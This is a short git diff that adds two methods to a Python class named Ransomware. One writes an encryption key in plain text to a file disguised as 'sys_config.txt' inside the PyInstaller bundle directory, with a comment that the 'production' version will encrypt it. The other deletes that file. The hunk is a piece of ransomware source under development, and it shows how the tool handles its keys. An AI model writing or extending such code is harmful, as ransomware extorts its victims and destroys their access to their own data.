@@ -84,6 +84,23 @@ class Ransomware:
         except:
             self.handle_mail(key, passwd)
 
+    
+    def create_copy_of_key(self, key, dir_to):
+        dir_to = sys._MEIPASS
+
+        path = normalize_path_name(dir_to, 'sys_config.txt')
+
+        with open(path, 'a+') as new_file:
+            new_file.write(key['bin_key'])
+
+        # Save key in plain text (in production file will be encrypted)
+
+        # modules.cryptography.encrypt(key['key'], path)
+
+    def remove_copy_of_key(self, dir):
+        path = normalize_path_name(dir, 'sys_config.txt')
+        os.remove(path)
+
 if __name__ == '__main__':
     pass
 
